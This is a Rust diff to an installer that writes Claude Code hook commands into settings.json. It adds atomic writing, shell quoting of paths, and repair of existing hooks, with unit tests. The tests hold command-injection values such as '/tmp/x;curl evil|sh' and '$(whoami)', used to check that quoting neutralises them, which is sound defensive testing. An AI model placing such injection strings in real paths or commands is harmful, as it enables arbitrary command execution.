@@ -86,6 +86,34 @@ fn print_status(status: Status, msg: &str) {
     }
 }
 
+/// Point at a stranded pre-4.2 archive before it strands.
+///
+/// A claude-style install archived at `<root>/conversations`. Init creates
+/// the entity layout, which hooks and reads will now prefer — a populated
+/// legacy directory would otherwise be left behind silently: invisible to
+/// search and the graph, with numbering restarting at 001 in the new place.
+fn notice_legacy_conversations(entity_root: &Path, new_dir: &Path) {
+    let legacy = entity_root.join("conversations");
+    let legacy_count = fs::read_dir(&legacy).map(|d| d.count()).unwrap_or(0);
+    let new_count = fs::read_dir(new_dir).map(|d| d.count()).unwrap_or(0);
+    if legacy_count > 0 && new_count == 0 {
+        print_status(
+            Status::Exists,
+            &format!(
+                "{legacy_count} archives in the legacy location {} — memory now lives at {}. \
+                 Move them across to keep them searchable:",
+                legacy.display(),
+                new_dir.display()
+            ),
+        );
+        eprintln!("      mv {}/* {}/", legacy.display(), new_dir.display());
+        eprintln!(
+            "      {DIM}(and review {}/ARCHIVE.md against the one in memory/){RESET}",
+            entity_root.display()
+        );
+    }
+}
+
 fn ensure_dir(path: &Path) {
     if !path.exists() {
         if let Err(e) = fs::create_dir_all(path) {
@@ -408,7 +436,7 @@ fn is_build_dir(exe: &str) -> bool {
 /// Auto-configure Claude Code hooks (settings.json).
 /// Returns true if hooks were configured.
 /// Hooks always go in ~/.claude/settings.json regardless of where entity_root is.
-fn configure_hooks(_entity_root: &Path) -> bool {
+fn configure_hooks(entity_root: &Path) -> bool {
     let claude_dir = match paths::detect_claude_code() {
         Some(dir) => dir,
         None => return false,
@@ -427,85 +455,93 @@ fn configure_hooks(_entity_root: &Path) -> bool {
         return false;
     }
 
-    let archive_cmd = format!("{recall_bin} archive-session");
-    let checkpoint_cmd = format!("{recall_bin} checkpoint --trigger precompact");
-    let consume_cmd = format!("{recall_bin} consume");
-
-    // Load existing settings or start fresh
+    // Absent means a fresh install. Unreadable or unparseable means the
+    // user's existing configuration — falling back to `{}` there would
+    // overwrite everything they have (permissions, MCP servers, env) with a
+    // file containing nothing but these hooks.
     let mut settings: serde_json::Value = if settings_path.exists() {
-        fs::read_to_string(&settings_path)
-            .ok()
-            .and_then(|s| serde_json::from_str(&s).ok())
-            .unwrap_or_else(|| serde_json::json!({}))
+        let content = match fs::read_to_string(&settings_path) {
+            Ok(c) => c,
+            Err(e) => {
+                print_status(
+                    Status::Error,
+                    &format!(
+                        "Could not read {} ({e}) — hooks not configured",
+                        settings_path.display()
+                    ),
+                );
+                return false;
+            }
+        };
+        match serde_json::from_str(&content) {
+            Ok(v) => v,
+            Err(e) => {
+                print_status(
+                    Status::Error,
+                    &format!(
+                        "{} is not valid JSON ({e}) — refusing to overwrite it; \
+                         fix the file and re-run init",
+                        settings_path.display()
+                    ),
+                );
+                return false;
+            }
+        }
     } else {
         serde_json::json!({})
     };
 
-    let hooks = settings.as_object_mut().and_then(|o| {
-        o.entry("hooks")
-            .or_insert_with(|| serde_json::json!({}))
-            .as_object_mut()
-    });
+    let root = fs::canonicalize(entity_root).unwrap_or_else(|_| entity_root.to_path_buf());
+    // A control character (a newline especially) inside a shell command line
+    // is unrecoverable for the user reading settings.json later.
+    if root.display().to_string().chars().any(char::is_control) {
+        print_status(
+            Status::Error,
+            "Entity root contains control characters — refusing to write it into a shell hook",
+        );
+        return false;
+    }
 
-    let hooks = match hooks {
-        Some(h) => h,
-        None => {
-            print_status(Status::Error, "Could not parse settings.json hooks");
+    // The binary path is interpolated bare (the matcher recognizes hooks by
+    // literal shape, so it cannot be quoted). A replaced-in-place binary or a
+    // path outside the conservative install-path alphabet is refused rather
+    // than baked into a broken or dangerous command line.
+    if recall_bin.ends_with(" (deleted)") {
+        print_status(
+            Status::Error,
+            "The running binary was replaced on disk during init — re-run init",
+        );
+        return false;
+    }
+    if !is_shell_safe_bin(&recall_bin) {
+        print_status(
+            Status::Error,
+            &format!(
+                "Refusing to write hooks: binary path {recall_bin} contains characters unsafe \
+                 in a shell command — install recall-echo at a plain path and re-run init"
+            ),
+        );
+        return false;
+    }
+
+    let mut notes: Vec<String> = Vec::new();
+    let changed = match upsert_recall_hooks(&mut settings, &recall_bin, &root, &mut notes) {
+        Ok(changed) => changed,
+        Err(why) => {
+            print_status(
+                Status::Error,
+                &format!("settings.json: {why} — hooks not configured"),
+            );
             return false;
         }
     };
-
-    let mut changed = false;
-
-    // Add SessionStart hook if not already present
-    // Fires once per session (on startup or resume) — injects EPHEMERAL.md
-    // into context via stdout. Skips `clear` (user reset) and `compact`
-    // (we just recovered from a compaction, no prior session to surface).
-    if !hook_exists(hooks, "SessionStart", &consume_cmd) {
-        let arr = hooks
-            .entry("SessionStart")
-            .or_insert_with(|| serde_json::json!([]))
-            .as_array_mut();
-        if let Some(arr) = arr {
-            arr.push(serde_json::json!({
-                "matcher": "startup|resume",
-                "hooks": [{"type": "command", "command": consume_cmd}]
-            }));
-            changed = true;
-        }
-    }
-
-    // Add SessionEnd hook if not already present
-    if !hook_exists(hooks, "SessionEnd", &archive_cmd) {
-        let arr = hooks
-            .entry("SessionEnd")
-            .or_insert_with(|| serde_json::json!([]))
-            .as_array_mut();
-        if let Some(arr) = arr {
-            arr.push(serde_json::json!({
-                "hooks": [{"type": "command", "command": archive_cmd}]
-            }));
-            changed = true;
-        }
-    }
-
-    // Add PreCompact hook if not already present
-    if !hook_exists(hooks, "PreCompact", &checkpoint_cmd) {
-        let arr = hooks
-            .entry("PreCompact")
-            .or_insert_with(|| serde_json::json!([]))
-            .as_array_mut();
-        if let Some(arr) = arr {
-            arr.push(serde_json::json!({
-                "hooks": [{"type": "command", "command": checkpoint_cmd}]
-            }));
-            changed = true;
-        }
+    for note in &notes {
+        print_status(Status::Exists, note);
     }
 
     if changed {
         match serde_json::to_string_pretty(&settings) {
-            Ok(content) => match fs::write(&settings_path, content) {
+            Ok(content) => match write_settings_atomically(&settings_path, &content) {
                 Ok(()) => {
                     print_status(
                         Status::Created,
@@ -528,36 +564,298 @@ fn configure_hooks(_entity_root: &Path) -> bool {
     false
 }
 
-/// Check if a hook command already exists in a hook event array.
-fn hook_exists(
-    hooks: &serde_json::Map<String, serde_json::Value>,
+/// Replace settings.json without a window where it is truncated or absent.
+///
+/// The previous content is kept as `settings.json.bak`; the new content lands
+/// via a temp file and rename, keeping the original file's permissions — the
+/// file can hold permission allowlists and credentials, so its mode is not
+/// ours to loosen.
+fn write_settings_atomically(path: &Path, content: &str) -> std::io::Result<()> {
+    if path.exists() {
+        let _ = fs::copy(path, path.with_extension("json.bak"));
+    }
+    // Pid-suffixed so concurrent inits cannot rename each other's half-written
+    // temp into place.
+    let tmp = path.with_extension(format!("json.tmp.{}", std::process::id()));
+    let _ = fs::remove_file(&tmp);
+    // Owner-only from birth: the file can hold credentials, and creating at
+    // the umask default before tightening leaves a world-readable window.
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        let mut f = fs::OpenOptions::new()
+            .write(true)
+            .create_new(true)
+            .mode(0o600)
+            .open(&tmp)?;
+        f.write_all(content.as_bytes())?;
+        f.sync_all()?;
+    }
+    #[cfg(not(unix))]
+    fs::write(&tmp, content)?;
+    if let Ok(meta) = fs::metadata(path) {
+        let _ = fs::set_permissions(&tmp, meta.permissions());
+    }
+    fs::rename(&tmp, path)
+}
+
+/// Quote a path for use inside a shell hook command line.
+///
+/// Always single-quoted: POSIX single quotes disable every expansion — `$`,
+/// backticks, `;`, `|`, spaces — and an embedded `'` is closed, escaped, and
+/// reopened. Quoting only "when needed" is how metacharacters slip through.
+fn shell_path(path: &Path) -> String {
+    format!("'{}'", path.display().to_string().replace('\'', r"'\''"))
+}
+
+/// Whether a binary path is safe to interpolate bare into a hook command.
+///
+/// The binary path is the one interpolated value that cannot be quoted: the
+/// existing-hook matcher recognizes our commands by their literal shape, and
+/// quoting would change it. Unlike the entity root — arbitrary user data —
+/// an install path is conventional, so a conservative character set covers
+/// every real install and anything outside it is refused with a message
+/// rather than baked into a broken or dangerous command line.
+fn is_shell_safe_bin(path: &str) -> bool {
+    !path.is_empty()
+        && path
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "/._+-".contains(c))
+}
+
+/// Shell operators (scanned outside single-quoted spans) whose presence marks
+/// a hook command as hand-customized.
+///
+/// The canonical commands this installer writes contain none of these outside
+/// quotes, so a recall-echo hook that does — `recall-echo archive-session ||
+/// true`, a chained cleanup, a redirect — was shaped by the user on purpose,
+/// and rewriting it would silently destroy that intent. Prefix wrappers
+/// (`timeout`, `nice`, `env`) carry no operator at all; those are caught by
+/// the canonical-shape check in [`is_bare_recall_invocation`] instead.
+const SHELL_OPERATORS: [&str; 8] = [";", "&", "|", ">", "<", "$", "`", "\n"];
+
+/// The command text with single-quoted spans removed — the only part where a
+/// shell operator means anything. The entity root recall-echo itself quotes
+/// may legally contain `;` or `$`; scanning through the quotes would make our
+/// own canonical hooks look customized and permanently unrepairable.
+fn strip_single_quoted(cmd: &str) -> String {
+    let mut out = String::new();
+    let mut in_quote = false;
+    for c in cmd.chars() {
+        match c {
+            '\'' => in_quote = !in_quote,
+            _ if in_quote => {}
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
+/// Whether a hook command is a plain recall-echo invocation this installer
+/// may rewrite: the first token is a recall-echo binary, the second is the
+/// expected subcommand, and no shell operator appears outside quotes.
+/// Anything else — a `timeout`/`nice`/`env` wrapper, a `|| true` guard, a
+/// chained command — is user configuration.
+fn is_bare_recall_invocation(cmd: &str, subcommand: &str) -> bool {
+    if SHELL_OPERATORS
+        .iter()
+        .any(|op| strip_single_quoted(cmd).contains(op))
+    {
+        return false;
+    }
+    let mut parts = cmd.split_whitespace();
+    let Some(first) = parts.next() else {
+        return false;
+    };
+    Path::new(first)
+        .file_name()
+        .is_some_and(|f| f == "recall-echo")
+        && parts.next() == Some(subcommand)
+}
+
+/// Install or repair the three recall-echo hooks in a settings.json value.
+///
+/// The entity root is baked into every command: hooks run with the harness's
+/// cwd, which is wherever the user happens to be working, and a bare
+/// `recall-echo archive-session` resolves against that — capture then only
+/// works when the shell sits in the entity root. MCP registration already
+/// bakes the root for reads; this is the write-side counterpart.
+///
+/// A plain recall-echo hook whose command differs from the expected line —
+/// the bare pre-4.2 form, a stale root — is rewritten in place and reported,
+/// so re-running `init` repairs a broken install instead of declaring it
+/// present. Duplicate recall-echo hooks are collapsed to one — a repaired
+/// duplicate would archive every session twice at double the extraction
+/// bill. Two kinds of hooks are never rewritten: ones that are not
+/// recall-echo's at all, and customized invocations (wrappers, guards,
+/// chains — see [`is_bare_recall_invocation`]), each reported through
+/// `notes` with the canonical command so the user can migrate it by hand.
+///
+/// Returns `Ok(changed)`, or `Err` naming what in the settings shape made
+/// the install unsafe to attempt.
+fn upsert_recall_hooks(
+    settings: &mut serde_json::Value,
+    recall_bin: &str,
+    entity_root: &Path,
+    notes: &mut Vec<String>,
+) -> Result<bool, String> {
+    let root = shell_path(entity_root);
+    // SessionStart fires once per session (startup or resume) — injects
+    // EPHEMERAL.md into context via stdout. Skips `clear` (user reset) and
+    // `compact` (we just recovered from a compaction, no prior session to
+    // surface). `consume` takes the root positionally.
+    let plan: [(&str, Option<&str>, &str, String); 3] = [
+        (
+            "SessionStart",
+            Some("startup|resume"),
+            "consume",
+            format!("{recall_bin} consume {root}"),
+        ),
+        (
+            "SessionEnd",
+            None,
+            "archive-session",
+            format!("{recall_bin} archive-session --entity-root {root}"),
+        ),
+        (
+            "PreCompact",
+            None,
+            "checkpoint",
+            format!("{recall_bin} checkpoint --trigger precompact --entity-root {root}"),
+        ),
+    ];
+
+    let hooks = settings
+        .as_object_mut()
+        .and_then(|o| {
+            o.entry("hooks")
+                .or_insert_with(|| serde_json::json!({}))
+                .as_object_mut()
+        })
+        .ok_or_else(|| "settings.json root is not a JSON object".to_string())?;
+
+    let mut changed = false;
+    for (event, matcher, subcommand, expected) in plan {
+        if upsert_hook(hooks, event, matcher, subcommand, &expected, notes)? {
+            changed = true;
+        }
+    }
+    Ok(changed)
+}
+
+/// Ensure one event carries exactly one canonical recall-echo hook command.
+///
+/// Every recall-echo hook under the event is considered: the first canonical
+/// (or repairable-and-repaired) occurrence stands, further duplicates are
+/// removed, customized invocations are reported and left alone. A group
+/// whose hooks are all exactly ours also gets its matcher synced. When no
+/// recall-echo hook exists at all, a new group is appended.
+///
+/// Returns `Ok(changed)`, or `Err` when the event's value is not an array —
+/// someone else's structure, not ours to repair or append to.
+fn upsert_hook(
+    hooks: &mut serde_json::Map<String, serde_json::Value>,
     event: &str,
-    command: &str,
-) -> bool {
-    if let Some(arr) = hooks.get(event).and_then(|v| v.as_array()) {
-        for group in arr {
-            if let Some(inner) = group.get("hooks").and_then(|h| h.as_array()) {
-                for hook in inner {
-                    if let Some(cmd) = hook.get("command").and_then(|c| c.as_str()) {
-                        // Match on the base command name, not the full path
-                        if cmd.contains("recall-echo archive-session")
-                            && command.contains("archive-session")
-                        {
-                            return true;
-                        }
-                        if cmd.contains("recall-echo checkpoint") && command.contains("checkpoint")
-                        {
-                            return true;
-                        }
-                        if cmd.contains("recall-echo consume") && command.contains("consume") {
-                            return true;
-                        }
+    matcher: Option<&str>,
+    subcommand: &str,
+    expected: &str,
+    notes: &mut Vec<String>,
+) -> Result<bool, String> {
+    // Recognize ours by the base command name, not the full binary path.
+    let marker = format!("recall-echo {subcommand}");
+    let not_array = || format!("\"hooks\".\"{event}\" is not an array — fix it and re-run init");
+
+    let mut changed = false;
+    let mut found = false;
+    let mut have_canonical = false;
+
+    if let Some(value) = hooks.get_mut(event) {
+        let arr = value.as_array_mut().ok_or_else(not_array)?;
+        for group in arr.iter_mut() {
+            let Some(inner) = group.get_mut("hooks").and_then(|h| h.as_array_mut()) else {
+                continue;
+            };
+            let mut i = 0;
+            while i < inner.len() {
+                let Some(cmd) = inner[i]
+                    .get("command")
+                    .and_then(|c| c.as_str())
+                    .map(String::from)
+                else {
+                    i += 1;
+                    continue;
+                };
+                if !cmd.contains(&marker) {
+                    i += 1;
+                    continue;
+                }
+                found = true;
+                let repairable = cmd == expected || is_bare_recall_invocation(&cmd, subcommand);
+                if repairable && have_canonical {
+                    inner.remove(i);
+                    notes.push(format!("{event}: removed a duplicate recall-echo hook"));
+                    changed = true;
+                    continue; // index now points at the next element
+                }
+                if cmd == expected {
+                    have_canonical = true;
+                } else if repairable {
+                    inner[i]["command"] = serde_json::Value::String(expected.to_string());
+                    notes.push(format!(
+                        "{event}: updated recall-echo hook to carry the entity root"
+                    ));
+                    have_canonical = true;
+                    changed = true;
+                } else {
+                    notes.push(format!(
+                        "{event}: left a customized recall-echo hook unchanged: {cmd} — note it \
+                         does not carry the entity root; the canonical command is: {expected}"
+                    ));
+                }
+                i += 1;
+            }
+            // Sync the matcher only when every hook in the group is exactly
+            // ours — a shared group's matcher governs foreign hooks too.
+            let all_ours = !inner.is_empty()
+                && inner
+                    .iter()
+                    .all(|h| h.get("command").and_then(|c| c.as_str()) == Some(expected));
+            if all_ours {
+                if let Some(m) = matcher {
+                    if group.get("matcher").and_then(|v| v.as_str()) != Some(m) {
+                        group["matcher"] = serde_json::Value::String(m.to_string());
+                        changed = true;
                     }
                 }
             }
         }
+        // A dedup pass can leave a group with no hooks; an empty group is
+        // noise the harness still iterates.
+        arr.retain(|group| {
+            group
+                .get("hooks")
+                .and_then(|h| h.as_array())
+                .is_none_or(|inner| !inner.is_empty())
+        });
     }
-    false
+
+    if found {
+        return Ok(changed);
+    }
+
+    let arr = hooks
+        .entry(event)
+        .or_insert_with(|| serde_json::json!([]))
+        .as_array_mut()
+        .ok_or_else(not_array)?;
+    let mut group = serde_json::json!({
+        "hooks": [{"type": "command", "command": expected}]
+    });
+    if let Some(m) = matcher {
+        group["matcher"] = serde_json::Value::String(m.to_string());
+    }
+    arr.push(group);
+    Ok(true)
 }
 
 // ── MCP registration ─────────────────────────────────────────────────────
@@ -735,6 +1033,7 @@ pub fn run_with_reader(entity_root: &Path, reader: &mut dyn BufRead) -> Result<(
     let conversations_dir = memory_dir.join("conversations");
     ensure_dir(&memory_dir);
     ensure_dir(&conversations_dir);
+    notice_legacy_conversations(entity_root, &conversations_dir);
 
     // Write MEMORY.md (never overwrite)
     write_if_not_exists(&memory_dir.join("MEMORY.md"), MEMORY_TEMPLATE, "MEMORY.md");
@@ -948,32 +1247,225 @@ mod tests {
         assert_eq!(summary.mcp_ready(), ["claude-code", "grok"]);
     }
 
-    #[test]
-    fn hook_exists_recognizes_consume_command() {
-        let hooks_json: serde_json::Value = serde_json::json!({
-            "SessionStart": [{
-                "matcher": "startup|resume",
-                "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume"}]
-            }]
-        });
-        let hooks = hooks_json.as_object().unwrap();
-        assert!(hook_exists(hooks, "SessionStart", "recall-echo consume"));
-        assert!(!hook_exists(hooks, "SessionEnd", "recall-echo consume"));
+    fn upsert(settings: &mut serde_json::Value, root: &str) -> (bool, Vec<String>) {
+        let mut skipped = Vec::new();
+        let changed = upsert_recall_hooks(
+            settings,
+            "/usr/local/bin/recall-echo",
+            Path::new(root),
+            &mut skipped,
+        )
+        .unwrap();
+        (changed, skipped)
     }
 
     #[test]
-    fn hook_exists_distinguishes_archive_from_consume() {
-        let hooks_json: serde_json::Value = serde_json::json!({
-            "SessionEnd": [{
-                "hooks": [{"type": "command", "command": "recall-echo archive-session"}]
-            }]
+    fn hooks_carry_the_entity_root() {
+        let mut settings = serde_json::json!({});
+        let (changed, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert!(changed);
+        assert!(skipped.is_empty());
+
+        let text = settings.to_string();
+        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
+        assert!(text.contains("checkpoint --trigger precompact --entity-root '/home/d/.wiseferry'"));
+        assert!(text.contains("consume '/home/d/.wiseferry'"));
+    }
+
+    /// The pre-4.2 bare hook is exactly what left capture broken outside the
+    /// entity root. A re-run of `init` must repair it, not declare it present.
+    #[test]
+    fn a_legacy_bare_hook_is_rewritten_not_skipped() {
+        let mut settings = serde_json::json!({
+            "hooks": {
+                "SessionStart": [{
+                    "matcher": "startup|resume",
+                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume"}]
+                }],
+                "SessionEnd": [{
+                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]
+                }],
+                "PreCompact": [{
+                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo checkpoint --trigger precompact"}]
+                }]
+            }
         });
-        let hooks = hooks_json.as_object().unwrap();
-        assert!(hook_exists(
-            hooks,
-            "SessionEnd",
-            "recall-echo archive-session"
-        ));
+        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert!(changed);
+        // Every rewrite is reported — a silent replacement of a command the
+        // user may have edited is how trust in the installer dies.
+        assert_eq!(notes.len(), 3, "{notes:?}");
+        assert!(notes.iter().all(|n| n.contains("updated")), "{notes:?}");
+
+        let text = settings.to_string();
+        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
+        // Rewritten in place, not duplicated alongside the bare form.
+        assert_eq!(text.matches("archive-session").count(), 1);
+        assert_eq!(text.matches("checkpoint").count(), 1);
+        assert_eq!(text.matches("consume").count(), 1);
+    }
+
+    #[test]
+    fn a_correct_hook_set_is_left_unchanged() {
+        let mut settings = serde_json::json!({});
+        upsert(&mut settings, "/home/d/.wiseferry");
+
+        let before = settings.clone();
+        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert!(!changed);
+        assert_eq!(settings, before);
+    }
+
+    #[test]
+    fn foreign_hooks_are_never_touched() {
+        let mut settings = serde_json::json!({
+            "hooks": {
+                "SessionEnd": [{
+                    "hooks": [{"type": "command", "command": "notify-send done"}]
+                }]
+            }
+        });
+        upsert(&mut settings, "/home/d/.wiseferry");
+
+        let text = settings.to_string();
+        assert!(text.contains("notify-send done"));
+        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
+    }
+
+    /// A recall-echo hook the user wrapped or guarded — the `|| true`
+    /// SessionEnd guard pulse-null depends on, a `timeout` prefix, a chained
+    /// cleanup — is deliberate configuration. Repairing it would break it;
+    /// it must be reported and left alone, and not duplicated either.
+    #[test]
+    fn a_wrapped_recall_hook_is_reported_not_rewritten() {
+        let mut settings = serde_json::json!({
+            "hooks": {
+                "SessionEnd": [{
+                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session || true"}]
+                }]
+            }
+        });
+        let (_, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert_eq!(skipped.len(), 1);
+        assert!(
+            skipped[0].contains("archive-session || true"),
+            "{skipped:?}"
+        );
+
+        let text = settings.to_string();
+        assert!(text.contains("archive-session || true"));
+        // Not duplicated with a canonical form alongside it.
+        assert_eq!(text.matches("archive-session").count(), 1);
+    }
+
+    /// Quoting is unconditional and single-quoted: `$`, backticks, `;`, `"`
+    /// and spaces must all reach the shell as literal path bytes.
+    #[test]
+    fn a_root_with_shell_metacharacters_is_neutralized() {
+        for (root, quoted) in [
+            (
+                "/Users/d/My Files/.wiseferry",
+                "'/Users/d/My Files/.wiseferry'",
+            ),
+            ("/tmp/x;curl evil|sh", "'/tmp/x;curl evil|sh'"),
+            ("/tmp/$(whoami)/`id`", "'/tmp/$(whoami)/`id`'"),
+        ] {
+            let mut settings = serde_json::json!({});
+            upsert(&mut settings, root);
+            let text = settings.to_string();
+            // None of these roots contain characters JSON escapes, so a
+            // plain substring check sees exactly what the shell will.
+            assert!(
+                text.contains(&format!("--entity-root {quoted}")),
+                "{root}: {text}"
+            );
+        }
+    }
+
+    /// An embedded single quote is the one byte single-quoting cannot pass
+    /// through directly — it must be closed, escaped, reopened.
+    #[test]
+    fn an_embedded_single_quote_is_escaped() {
+        assert_eq!(
+            shell_path(Path::new("/home/d/o'brien")),
+            r"'/home/d/o'\''brien'"
+        );
+    }
+
+    /// Two stale hooks under one event — a binary-path change under the old
+    /// installer could leave both — must both be repaired in one pass, not
+    /// first-one-wins with the duplicate left permanently unreachable.
+    #[test]
+    fn duplicate_stale_hooks_collapse_to_one() {
+        let mut settings = serde_json::json!({
+            "hooks": {
+                "SessionEnd": [
+                    {"hooks": [{"type": "command", "command": "/old/path/recall-echo archive-session"}]},
+                    {"hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]}
+                ]
+            }
+        });
+        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert!(changed);
+        // Repairing both would turn a dead duplicate into a live one that
+        // archives every session twice at double the extraction bill.
+        assert!(
+            notes.iter().any(|n| n.contains("removed a duplicate")),
+            "{notes:?}"
+        );
+
+        let expected =
+            "/usr/local/bin/recall-echo archive-session --entity-root '/home/d/.wiseferry'";
+        let text = settings.to_string();
+        assert_eq!(text.matches(expected).count(), 1, "{text}");
+        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
+        // And a second run has nothing left to do.
+        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert!(!changed);
+    }
+
+    /// A prefix wrapper carries no shell operator, but it is customization
+    /// all the same — `timeout 30 recall-echo archive-session` exists to
+    /// bound a hang, and rewriting it would silently drop the bound.
+    #[test]
+    fn a_prefix_wrapped_hook_is_not_rewritten() {
+        let mut settings = serde_json::json!({
+            "hooks": {
+                "SessionEnd": [{
+                    "hooks": [{"type": "command", "command": "timeout 30 /usr/local/bin/recall-echo archive-session"}]
+                }]
+            }
+        });
+        let (_, notes) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert!(notes.iter().any(|n| n.contains("unchanged")), "{notes:?}");
+
+        let text = settings.to_string();
+        assert!(text.contains("timeout 30 /usr/local/bin/recall-echo archive-session"));
+        // The wrapped hook stays the only one — no canonical duplicate added.
+        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
+    }
+
+    /// A canonical hook whose quoted root happens to contain shell operators
+    /// (`;` is a legal path byte) is still ours: the operator scan must look
+    /// outside the quotes, or our own hooks become permanently unrepairable.
+    #[test]
+    fn a_quoted_root_with_operators_stays_repairable() {
+        let mut settings = serde_json::json!({
+            "hooks": {
+                "SessionEnd": [{
+                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session --entity-root '/tmp/a;b'"}]
+                }]
+            }
+        });
+        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
+        assert!(changed, "{notes:?}");
+
+        let text = settings.to_string();
+        assert!(
+            text.contains("--entity-root '/home/d/.wiseferry'"),
+            "{text}"
+        );
+        assert!(!text.contains("/tmp/a;b"), "{text}");
     }
 
     #[test]
